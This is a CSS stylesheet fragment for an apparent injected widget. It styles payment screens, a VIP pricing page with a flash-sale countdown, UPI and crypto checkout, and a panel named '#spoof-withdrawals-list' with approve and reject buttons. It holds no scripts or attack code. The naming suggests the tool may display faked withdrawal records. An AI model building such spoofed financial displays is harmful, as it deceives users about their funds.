    justify-content: center;
    color: #fff;
    background: rgba(160, 143, 255, 0.16);
  }
  .pay-route-icon svg {
    width: 19px;
    height: 19px;
  }
  .pay-route-note {
    margin-top: 10px;
    color: #8b8ea0;
    font-size: 12px;
    font-weight: 600;
    text-align: center;
  }
  :host(.light) .pay-route-card {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
    color: #111;
    box-shadow: inset 3px 0 0 #f95959;
  }
  :host(.light) .pay-route-index {
    background: linear-gradient(90deg, #f95959, #ff8080);
  }
  :host(.light) .pay-route-title {
    color: #111;
  }
  :host(.light) .pay-route-sub,
  :host(.light) .pay-route-note {
    color: #777;
  }
  :host(.light) .pay-route-icon {
    background: rgba(249, 89, 89, 0.08);
    color: #f95959;
  }
  .pay-field-wrapper {
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 16px;
    display: flex;
    align-items: center;
    padding: 6px 6px 6px 16px;
    transition: all 0.2s cubic-bezier(0.16, 1, 0.3, 1);
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.03);
  }
  .pay-field-wrapper:focus-within {
    border-color: #bd5bd4;
    box-shadow:
      0 0 0 3px rgba(189, 91, 212, 0.15),
      0 4px 12px rgba(0, 0, 0, 0.2);
  }
  :host(.light) .pay-field-wrapper {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.08);
    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.02);
  }
  :host(.light) .pay-field-wrapper:focus-within {
    border-color: #f95959;
    box-shadow: 0 0 0 3px rgba(249, 89, 89, 0.1);
  }
  .pay-utr-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    font-size: 15px;
    font-weight: 500;
    color: #fff;
    font-family: var(--f);
    padding: 10px 0;
    letter-spacing: 1px;
  }
  .pay-utr-input::placeholder {
    color: #5a5d72;
    font-weight: 400;
    letter-spacing: normal;
  }
  :host(.light) .pay-utr-input {
    color: #111;
  }
  :host(.light) .pay-utr-input::placeholder {
    color: #999;
  }
  .pay-paste-pill {
    background: rgba(255, 255, 255, 0.08);
    color: #fff;
    border: none;
    border-radius: 12px;
    padding: 9px 14px;
    font-size: 12px;
    font-weight: 800;
    cursor: pointer;
    transition: all 0.2s;
  }
  .pay-paste-pill:active {
    background: rgba(255, 255, 255, 0.1);
    transform: scale(0.95);
  }
  :host(.light) .pay-paste-pill {
    background: rgba(0, 0, 0, 0.04);
    color: #111;
  }
  :host(.light) .pay-paste-pill:active {
    background: rgba(0, 0, 0, 0.08);
  }
  .pay-utr-warn {
    display: flex;
    align-items: flex-start;
    gap: 6px;
    margin-top: 10px;
    padding: 0 4px;
  }
  .pay-utr-warn svg {
    width: 14px;
    height: 14px;
    color: #ef4444;
    flex-shrink: 0;
    margin-top: 1px;
  }
  .pay-utr-warn-txt {
    font-size: 11px;
    color: #ef4444;
    opacity: 0.9;
    line-height: 1.4;
    font-weight: 500;
  }
  .pay-submit-btn {
    width: 100%;
    padding: 16px;
    border-radius: 999px;
    border: none;
    background: linear-gradient(90deg, #fb8466, #bd5bd4, #7473fa, #53b2fa);
    background-size: 200% 200%;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    font-family: var(--f);
    cursor: pointer;
    position: relative;
    overflow: hidden;
    box-shadow:
      0 10px 22px rgba(116, 115, 250, 0.28),
      inset 0 1px 0 rgba(255, 255, 255, 0.22);
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  }
  .pay-submit-btn:active:not(.disabled) {
    transform: translateY(2px) scale(0.98);
    box-shadow:
      0 2px 10px rgba(116, 115, 250, 0.2),
      inset 0 1px 0 rgba(255, 255, 255, 0.1);
  }
  .pay-submit-btn.disabled {
    background: #2a2a35 !important;
    color: #5a5d72 !important;
    box-shadow: none !important;
    cursor: not-allowed;
  }
  :host(.light) .pay-submit-btn {
    background: linear-gradient(90deg, #f95959, #ff8080);
    box-shadow:
      0 6px 20px rgba(249, 89, 89, 0.3),
      inset 0 1px 0 rgba(255, 255, 255, 0.3);
  }
  :host(.light) .pay-submit-btn.disabled {
    background: #e8e8e8 !important;
    color: #999 !important;
  }
  .pay-order-meta {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 12px 20px 0;
    margin-top: 4px;
    position: relative;
  }
  .pay-order-meta::before {
    content: "";
    position: absolute;
    top: 0;
    left: 20px;
    right: 20px;
    height: 1px;
    background: rgba(255, 255, 255, 0.05);
  }
  :host(.light) .pay-order-meta::before {
    background: rgba(0, 0, 0, 0.05);
  }
  .pay-order-lbl {
    font-size: 12px;
    color: #5a5d72;
    font-weight: 500;
  }
  .pay-order-val {
    font-size: 13px;
    color: #8b8ea0;
    font-family: monospace;
    letter-spacing: 0.5px;
  }
  .pay-confirm-mask {
    position: fixed;
    inset: 0;
    z-index: 100000;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
    opacity: 0;
    pointer-events: none;
    transition: opacity 0.3s ease;
  }
  .pay-confirm-mask::before {
    content: "";
    position: absolute;
    inset: 0;
    background: rgba(0, 0, 0, 0.7);
    backdrop-filter: blur(4px);
  }
  .pay-confirm-mask.active {
    opacity: 1;
    pointer-events: auto;
  }
  .pay-confirm-box {
    position: relative;
    z-index: 1;
    width: 100%;
    max-width: 310px;
    background: #22224b;
    border: 1px solid rgba(255, 255, 255, 0.08);
    border-radius: 20px;
    padding: 28px 24px 24px;
    text-align: center;
    transform: scale(0.95) translateY(10px);
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    box-shadow:
      0 20px 40px rgba(0, 0, 0, 0.4),
      inset 0 1px 0 rgba(255, 255, 255, 0.05);
  }
  .pay-confirm-mask.active .pay-confirm-box {
    transform: scale(1) translateY(0);
  }
  :host(.light) .pay-confirm-box {
    background: #fff;
    border-color: rgba(0, 0, 0, 0.05);
    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
  }
  .pay-conf-icon {
    width: 48px;
    height: 48px;
    margin: 0 auto 16px;
    color: #c4b5fd;
    background: rgba(196, 181, 253, 0.1);
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .pay-conf-icon svg {
    width: 24px;
    height: 24px;
  }
  :host(.light) .pay-conf-icon {
    color: #f95959;
    background: rgba(249, 89, 89, 0.08);
  }
  .pay-conf-ttl {
    font-size: 18px;
    font-weight: 700;
    color: #fff;
    margin-bottom: 8px;
    letter-spacing: -0.3px;
  }
  :host(.light) .pay-conf-ttl {
    color: #111;
  }
  .pay-conf-msg {
    font-size: 13.5px;
    color: #8b8ea0;
    line-height: 1.5;
    margin-bottom: 28px;
  }
  .pay-conf-msg b {
    color: #fff;
    font-weight: 600;
  }
  :host(.light) .pay-conf-msg {
    color: #666;
  }
  :host(.light) .pay-conf-msg b {
    color: #f95959;
  }
  .pay-conf-acts {
    display: flex;
    gap: 12px;
  }
  .pay-conf-btn {
    flex: 1;
    padding: 12px;
    border-radius: 12px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
    border: none;
    font-family: var(--f);
    outline: none;
  }
  .pay-conf-btn.no {
    background: rgba(255, 255, 255, 0.05);
    color: #c8cad0;
  }
  :host(.light) .pay-conf-btn.no {
    background: rgba(0, 0, 0, 0.04);
    color: #666;
  }
  .pay-conf-btn.no:active {
    background: rgba(255, 255, 255, 0.1);
  }
  .pay-conf-btn.yes {
    background: linear-gradient(90deg, #fb8466, #bd5bd4);
    color: #fff;
    box-shadow: 0 4px 12px rgba(189, 91, 212, 0.3);
  }
  :host(.light) .pay-conf-btn.yes {
    background: linear-gradient(90deg, #f95959, #ff8080);
    box-shadow: 0 4px 12px rgba(249, 89, 89, 0.3);
  }
  .pay-conf-btn.yes:active {
    transform: scale(0.96);
    box-shadow: 0 2px 8px rgba(189, 91, 212, 0.2);
  }
  #spoof-withdrawals-list {
    display: flex;
    flex-direction: column;
    gap: 8px;
    margin-top: 8px;
    max-height: 250px;
    overflow-y: auto;
  }
  .w-item {
    display: flex;
    flex-direction: column;
    gap: 8px;
    padding: 10px;
    border-radius: 10px;
    background: rgba(255, 255, 255, 0.03);
    border: 1px solid rgba(255, 255, 255, 0.06);
  }
  :host(.light) .w-item {
    background: #fafafa;
    border-color: rgba(0, 0, 0, 0.06);
  }
  .w-info {
    display: grid;
    grid-template-columns: 1fr auto;
    gap: 4px;
    font-size: 11px;
  }
  .w-id {
    font-weight: 600;
    color: var(--t-title);
    grid-column: 1;
  }
  .w-amt {
    font-weight: 800;
    color: #fb8466;
    text-align: right;
    grid-column: 2;
  }
  :host(.light) .w-amt {
    color: #f95959;
  }
  .w-time {
    color: var(--t-dim);
    font-size: 9.5px;
  }
  .w-state {
    font-weight: 700;
    text-align: right;
    font-size: 10px;
  }
  .status-processing {
    color: #f5a623;
  }
  .status-success {
    color: #16a34a;
  }
  .status-failed {
    color: #ef4444;
  }
  .status-other {
    color: #8b8ea0;
  }
  .w-actions {
    display: flex;
    gap: 6px;
  }
  .w-actions button {
    flex: 1;
    padding: 6px;
    border: none;
    border-radius: 6px;
    font-size: 10px;
    font-weight: 700;
    cursor: pointer;
    transition: all 0.15s;
    font-family: var(--f);
  }
  .w-actions button:active {
    transform: scale(0.96);
  }
  .btn-approve {
    background: rgba(22, 163, 74, 0.15);
    color: #22c55e;
    border: 1px solid rgba(22, 163, 74, 0.3);
  }
  .btn-approve:hover {
    background: rgba(22, 163, 74, 0.25);
  }
  .btn-reject {
    background: rgba(239, 68, 68, 0.15);
    color: #ef4444;
    border: 1px solid rgba(239, 68, 68, 0.3);
  }
  .btn-reject:hover {
    background: rgba(239, 68, 68, 0.25);
  } /* ── VIP Pricing ── */
  .view-vip.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  @keyframes vipFadeIn {
    from {
      opacity: 0;
      transform: translateY(3px);
    }
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }
  .vip-pricing-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-offer-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-offer-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--vip) 32%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-balls-track {
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 11px 8px 9px;
  }
  .vip-ball {
    width: 22px;
    height: 22px;
    border-radius: 50%;
    flex-shrink: 0;
    display: block;
    object-fit: contain;
    box-shadow: 0 1px 4px rgba(0, 0, 0, 0.18);
  }
  :host(.light) .vip-ball {
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
  }
  .vip-ball + .vip-ball {
    margin-left: -5px;
  }
  .vip-flash-strip {
    position: relative;
    isolation: isolate;
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    margin: 0 10px 8px;
    padding: 9px 10px;
    overflow: hidden;
    border: 1px solid color-mix(in srgb, #ff8a45 42%, transparent);
    border-radius: 11px;
    background: linear-gradient(
      115deg,
      color-mix(in srgb, #ff7139 19%, var(--card-bg)),
      color-mix(in srgb, #8b5cf6 18%, var(--card-bg))
    );
    box-shadow:
      0 8px 24px rgba(255, 103, 52, 0.11),
      inset 0 1px 0 rgba(255, 255, 255, 0.08);
  }
  .vip-flash-strip::after {
    content: "";
    position: absolute;
    z-index: -1;
    top: -80%;
    bottom: -80%;
    width: 35%;
    left: -45%;
    transform: rotate(18deg);
    background: linear-gradient(
      90deg,
      transparent,
      rgba(255, 255, 255, 0.18),
      transparent
    );
    animation: vipFlashSweep 3.6s ease-in-out infinite;
  }
  @keyframes vipFlashSweep {
    55%,
    100% {
      left: 120%;
    }
  }
  .vip-flash-copy {
    display: flex;
    flex-direction: column;
    gap: 2px;
    min-width: 0;
  }
  .vip-flash-badge {
    width: fit-content;
    padding: 2px 6px;
    border-radius: 999px;
    background: linear-gradient(120deg, #ff7139, #ff3f76);
    color: #fff;
    font-size: 7.5px;
    line-height: 1.35;
    font-weight: 900;
    letter-spacing: 0.75px;
    text-transform: uppercase;
    box-shadow: 0 3px 9px rgba(255, 71, 78, 0.24);
  }
  .vip-flash-saving {
    color: var(--t-title);
    font-size: 10px;
    font-weight: 750;
    letter-spacing: -0.1px;
  }
  .vip-flash-clock {
    display: flex;
    flex-direction: column;
    align-items: flex-end;
    flex-shrink: 0;
  }
  .vip-flash-clock span {
    color: var(--t-dim);
    font-size: 7.5px;
    font-weight: 700;
    letter-spacing: 0.7px;
    text-transform: uppercase;
  }
  .vip-flash-clock strong {
    color: #ff7548;
    font-size: 15px;
    line-height: 1.15;
    font-weight: 900;
    letter-spacing: 0.35px;
    font-variant-numeric: tabular-nums;
    text-shadow: 0 0 16px rgba(255, 103, 52, 0.28);
  }
  .vip-flash-strip-pay {
    margin: 0 0 8px;
  }
  :host(.light) .vip-flash-strip {
    box-shadow: 0 8px 22px rgba(255, 103, 52, 0.09);
  }
  @media (prefers-reduced-motion: reduce) {
    .vip-flash-strip::after {
      animation: none;
    }
  }
  .vip-perks {
    display: flex;
    flex-direction: column;
    gap: 2px;
    padding: 6px 10px;
    border-top: 1px solid var(--strip);
  }
  .vip-perk-item {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 7px 8px;
    border-radius: 8px;
    background: transparent;
    cursor: pointer;
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
    user-select: none;
  }
  .vip-perk-item:hover {
    background: var(--strip);
    transform: translateX(2px);
  }
  .vip-perk-item:active {
    transform: scale(0.985) translateX(2px);
  }
  .vip-perk-mark {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--vip);
    stroke-width: 2.2;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    transition: transform 0.2s var(--ease);
  }
  .vip-perk-item:hover .vip-perk-mark {
    transform: scale(1.15);
  }
  .vip-perk-content {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 1px;
  }
  .vip-perk-title {
    font-size: 11px;
    font-family: var(--f);
    font-weight: 600;
    color: var(--t-title);
    letter-spacing: -0.15px;
    line-height: 1.3;
  }
  .vip-perk-desc {
    font-size: 8.5px;
    font-family: var(--f);
    font-weight: 400;
    color: var(--t-body);
    letter-spacing: 0.05px;
    opacity: 0.85;
  }
  .vip-perk-arrow {
    width: 12px;
    height: 12px;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease),
      stroke 0.16s var(--ease);
  }
  .vip-perk-item:hover .vip-perk-arrow {
    opacity: 0.7;
    transform: translateX(0);
  }
  .vip-perk-item:hover .vip-perk-arrow:hover {
    stroke: var(--vip);
  }
  .vip-offer-foot {
    padding: 9px 13px 12px;
    border-top: 1px solid var(--strip);
  }
  .vip-price-line {
    display: flex;
    align-items: baseline;
    justify-content: center;
    gap: 3px;
    margin-bottom: 2px;
  }
  .vip-price-old {
    margin-right: 3px;
    color: var(--t-dim);
    font-size: 11px;
    font-weight: 650;
    text-decoration: line-through;
    text-decoration-thickness: 1.5px;
    opacity: 0.72;
  }
  .vip-price-amt {
    font-size: 21px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.5px;
    font-variant-numeric: tabular-nums;
    line-height: 1;
  }
  .vip-price-unit {
    font-size: 10.5px;
    font-weight: 500;
    color: var(--t-dim);
  }
  .vip-price-meta {
    margin: 0 0 9px;
    text-align: center;
    font-size: 9.5px;
    color: var(--t-dim);
    letter-spacing: 0.05px;
  }
  .vip-checkout-btn {
    width: 100%;
    padding: 11px;
    border-radius: 11px;
    border: none;
    background: var(--pro);
    color: #fff;
    font-size: 12.5px;
    font-weight: 700;
    letter-spacing: -0.1px;
    cursor: pointer;
    font-family: var(--f);
    box-shadow: 0 2px 12px color-mix(in srgb, var(--pro) 30%, transparent);
    transition:
      transform 0.15s cubic-bezier(0.16, 1, 0.3, 1),
      box-shadow 0.15s cubic-bezier(0.16, 1, 0.3, 1);
    position: relative;
    overflow: hidden;
  }
  .vip-checkout-btn::after {
    content: "";
    position: absolute;
    inset: 0;
    background: linear-gradient(
      135deg,
      rgba(255, 255, 255, 0.1),
      transparent 52%
    );
    pointer-events: none;
  }
  .vip-checkout-btn:hover {
    box-shadow: 0 4px 16px color-mix(in srgb, var(--pro) 40%, transparent);
  }
  .vip-checkout-btn:active {
    transform: scale(0.98);
    transition-duration: 0.06s;
  } /* ── VIP Select Payment ── */
  .view-vip-pay.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-hist-btn {
    width: 32px;
    height: 32px;
    border-radius: 10px;
    flex-shrink: 0;
    margin-left: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid var(--back-bdr);
    background: var(--back-bg);
    color: var(--back-col);
    cursor: pointer;
    padding: 0;
    transition:
      color 0.15s,
      border-color 0.15s,
      background 0.15s;
  }
  .vip-hist-btn svg {
    width: 14px;
    height: 14px;
  }
  .vip-hist-btn:hover {
    color: var(--back-col-h);
    border-color: var(--back-bdr-h);
    background: var(--pro-lt);
  }
  .vip-hist-btn:active {
    transform: scale(0.97);
    transition-duration: 0.06s;
  }
  .vip-pay-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-pay-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-pay-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-pay-summary {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 10px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-pay-summary-lbl {
    font-size: 10px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
  }
  .vip-pay-summary-amt {
    display: flex;
    align-items: baseline;
    gap: 6px;
    font-size: 14px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.4px;
    font-variant-numeric: tabular-nums;
  }
  .vip-pay-summary-amt s {
    color: var(--t-dim);
    font-size: 9.5px;
    font-weight: 600;
    opacity: 0.7;
  }
  .vip-pay-options {
    display: flex;
    flex-direction: column;
  }
  .vip-pay-opt {
    display: flex;
    align-items: center;
    gap: 10px;
    width: 100%;
    padding: 10px 11px;
    border: none;
    background: transparent;
    cursor: pointer;
    text-align: left;
    font-family: var(--f);
    transition:
      background 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .vip-pay-opt + .vip-pay-opt {
    border-top: 1px solid var(--strip);
  }
  .vip-pay-opt:hover {
    background: var(--strip);
  }
  .vip-pay-opt:active {
    transform: scale(0.99);
    transition-duration: 0.06s;
  }
  .vip-pay-opt-icon {
    width: 34px;
    height: 34px;
    border-radius: 10px;
    flex-shrink: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    transition: transform 0.18s var(--ease);
  }
  .vip-pay-opt-icon svg {
    width: 17px;
    height: 17px;
    fill: currentColor;
  }
  .vip-pay-upi .vip-pay-opt-icon {
    background: var(--upi-lt);
    color: var(--upi);
  }
  .vip-pay-crypto .vip-pay-opt-icon {
    background: var(--crypto-lt);
    color: var(--crypto);
  }
  .vip-pay-opt:hover .vip-pay-opt-icon {
    transform: scale(1.06);
  }
  .vip-pay-opt-body {
    flex: 1;
    min-width: 0;
  }
  .vip-pay-opt-top {
    display: flex;
    align-items: center;
    gap: 6px;
    margin-bottom: 1px;
  }
  .vip-pay-opt-name {
    font-size: 12.5px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: -0.15px;
  }
  .vip-pay-opt-desc {
    display: block;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-body);
    letter-spacing: 0.02px;
  }
  .vip-pay-opt-arrow {
    width: 12px;
    height: 12px;
    flex-shrink: 0;
    stroke: var(--t-dim);
    stroke-width: 2.5;
    stroke-linecap: round;
    stroke-linejoin: round;
    fill: none;
    opacity: 0;
    transform: translateX(-4px);
    transition:
      opacity 0.16s var(--ease),
      transform 0.16s var(--ease);
  }
  .vip-pay-upi:hover .vip-pay-opt-arrow {
    opacity: 0.7;
    transform: translateX(0);
    stroke: var(--upi);
  }
  .vip-pay-crypto:hover .vip-pay-opt-arrow {
    opacity: 0.7;
    transform: translateX(0);
    stroke: var(--crypto);
  }
  .vip-pay-foot {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 6px;
    padding-top: 9px;
    margin-top: 8px;
    border-top: 1px solid var(--strip);
    font-size: 9.5px;
    color: var(--t-dim);
    font-weight: 500;
  }
  .vip-pay-trust {
    display: flex;
    align-items: center;
    gap: 4px;
  }
  .vip-pay-trust .status-dot {
    width: 4px;
    height: 4px;
  }
  .vip-pay-trust-sep {
    opacity: 0.35;
  }
  .vip-loader-overlay {
    position: absolute;
    inset: 0;
    z-index: 50;
    background: rgba(10, 8, 28, 0.78);
    backdrop-filter: blur(8px);
    -webkit-backdrop-filter: blur(8px);
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 14px;
    animation: viewIn 0.2s var(--ease);
  }
  :host(.light) .vip-loader-overlay {
    background: rgba(255, 255, 255, 0.82);
  }
  .vip-loader-label {
    font-size: 12px;
    font-weight: 700;
    color: var(--t-title);
    letter-spacing: 0.2px;
  }
  .vip-checkout-body {
    display: flex;
    flex-direction: column;
    padding: 4px 2px;
  } /* ── VIP Checkout + Submit Proof ── */
  .view-vip-checkout.active,
  .view-vip-submit.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-checkout-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-checkout-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-checkout-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-checkout-head {
    display: grid;
    grid-template-columns: 1fr 1fr;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-stat {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 2px;
    padding: 9px 10px;
    text-align: center;
  }
  .vip-checkout-stat + .vip-checkout-stat {
    border-left: 1px solid var(--strip);
  }
  .vip-checkout-stat-lbl {
    font-size: 9px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
  }
  .vip-checkout-stat-val {
    font-size: 15px;
    font-weight: 800;
    color: var(--t-title);
    letter-spacing: -0.3px;
    font-variant-numeric: tabular-nums;
    line-height: 1.1;
  }
  .vip-checkout-stat-amt .vip-checkout-stat-val {
    color: var(--vip);
  }
  .vip-checkout-qr {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 6px;
    padding: 12px 13px 10px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-qr-frame {
    width: 118px;
    height: 118px;
    padding: 7px;
    border-radius: 12px;
    background: #fff;
    border: 1px solid var(--card-bdr);
    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
    display: flex;
    align-items: center;
    justify-content: center;
  }
  :host(.light) .vip-checkout-qr-frame {
    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
  }
  #vip-qr-img {
    width: 100%;
    height: 100%;
    object-fit: contain;
    display: block;
  }
  .vip-checkout-qr-hint {
    margin: 0;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: 0.02px;
  }
  .vip-checkout-detail-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    padding: 8px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-detail-lbl {
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
    flex-shrink: 0;
  }
  .vip-detail-val {
    font-size: 10px;
    font-weight: 700;
    color: var(--t-title);
    font-family: var(--f);
    font-variant-numeric: tabular-nums;
    text-align: right;
    word-break: break-all;
  }
  .vip-checkout-payto {
    padding: 9px 13px 10px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-checkout-payto-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
    margin-bottom: 6px;
  }
  .vip-network-lbl {
    font-size: 8.5px;
    font-weight: 700;
    letter-spacing: 0.3px;
    color: var(--crypto);
    background: var(--crypto-lt);
    border: 1px solid color-mix(in srgb, var(--crypto) 22%, transparent);
    border-radius: 50px;
    padding: 2px 7px;
  }
  .vip-checkout-payto-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
  }
  .vip-address-val {
    font-size: 10.5px;
    font-weight: 600;
    color: var(--t-title);
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    word-break: break-all;
    flex: 1;
    min-width: 0;
    text-align: left;
    line-height: 1.35;
  }
  .vip-copy-btn {
    flex-shrink: 0;
    padding: 5px 10px;
    border-radius: 8px;
    border: 1px solid var(--card-bdr);
    background: var(--back-bg);
    color: var(--t-body);
    font-size: 10px;
    font-weight: 600;
    cursor: pointer;
    font-family: var(--f);
    transition:
      background 0.15s,
      color 0.15s,
      border-color 0.15s,
      transform 0.15s;
  }
  .vip-copy-btn:hover {
    background: var(--pro-lt);
    color: var(--t-title);
    border-color: var(--pro-bdr-h);
  }
  .vip-copy-btn:active {
    transform: scale(0.96);
  }
  .vip-copy-btn.copied {
    background: var(--mine);
    color: #fff;
    border-color: var(--mine);
  }
  .vip-upi-hint {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 5px;
    width: 100%;
    margin-top: 8px;
    padding: 0;
    border: none;
    background: transparent;
    font-size: 9.5px;
    font-weight: 600;
    color: var(--pro);
    cursor: pointer;
    letter-spacing: -0.05px;
    opacity: 0.85;
    transition:
      opacity 0.15s,
      transform 0.15s;
    font-family: var(--f);
  }
  .vip-upi-hint:hover {
    opacity: 1;
  }
  .vip-upi-hint:active {
    transform: scale(0.98);
  }
  .vip-upi-hint svg {
    transition: transform 0.35s var(--ease);
  }
  .vip-upi-hint:hover svg {
    transform: rotate(180deg);
  }
  .vip-checkout-foot {
    padding: 10px 13px 12px;
  }
  .vip-proof-section {
    padding: 11px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-proof-section:last-of-type {
    border-bottom: none;
  }
  .vip-proof-lbl {
    display: block;
    font-size: 9.5px;
    font-weight: 500;
    color: var(--t-dim);
    letter-spacing: -0.05px;
    margin-bottom: 7px;
  }
  .vip-proof-input {
    width: 100%;
    box-sizing: border-box;
    padding: 9px 10px;
    border-radius: 9px;
    border: 1px solid var(--card-bdr);
    background: var(--back-bg);
    color: var(--t-title);
    font-family: var(--f);
    font-size: 11.5px;
    font-weight: 600;
    outline: none;
    transition:
      border-color 0.15s,
      box-shadow 0.15s;
  }
  .vip-proof-input::placeholder {
    color: var(--t-dim);
    font-weight: 500;
  }
  .vip-proof-input:focus {
    border-color: var(--pro-bdr-h);
    box-shadow: 0 0 0 3px var(--pro-glow);
  }
  .vip-file-zone {
    border: 1.5px dashed var(--card-bdr);
    border-radius: 10px;
    height: 96px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    background: var(--back-bg);
    transition:
      border-color 0.15s,
      background 0.15s;
    overflow: hidden;
    position: relative;
  }
  .vip-file-zone:hover {
    border-color: var(--pro-bdr-h);
    background: var(--pro-lt);
  }
  .vip-file-placeholder {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 4px;
    font-size: 10px;
    font-weight: 500;
    color: var(--t-body);
    pointer-events: none;
  }
  .vip-file-placeholder svg {
    opacity: 0.55;
  }
  .vip-file-preview {
    display: none;
    width: 100%;
    height: 100%;
    object-fit: cover;
    border-radius: 8px;
  }
  .vip-file-remove {
    position: absolute;
    top: 7px;
    right: 7px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: color-mix(in srgb, var(--pro) 88%, #000);
    color: #fff;
    border: none;
    display: none;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    font-weight: 700;
    cursor: pointer;
    z-index: 10;
    transition: transform 0.15s;
    padding: 0;
    line-height: 1;
  }
  .vip-file-remove:hover {
    filter: brightness(1.08);
  }
  .vip-file-remove:active {
    transform: scale(0.9);
  } /* ── VIP Order History ── */
  .view-vip-history.active {
    animation: vipFadeIn 0.16s cubic-bezier(0.16, 1, 0.3, 1) both;
  }
  .vip-history-shell {
    display: flex;
    flex-direction: column;
  }
  .vip-history-card {
    background: var(--card-bg);
    border: 1px solid var(--card-bdr);
    border-radius: 14px;
    overflow: hidden;
    position: relative;
  }
  .vip-history-card::before {
    content: "";
    position: absolute;
    top: -1px;
    left: 14px;
    right: 14px;
    height: 1px;
    background: linear-gradient(
      90deg,
      transparent,
      color-mix(in srgb, var(--pro) 28%, transparent),
      transparent
    );
    pointer-events: none;
  }
  .vip-history-list {
    display: flex;
    flex-direction: column;
    max-height: 300px;
    overflow-y: auto;
    scrollbar-width: none;
  }
  .vip-history-list::-webkit-scrollbar {
    display: none;
  }
  .vip-history-row {
    padding: 9px 13px;
    border-bottom: 1px solid var(--strip);
  }
  .vip-history-row:last-child {
    border-bottom: none;
  }
  .vip-history-row-top {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 8px;
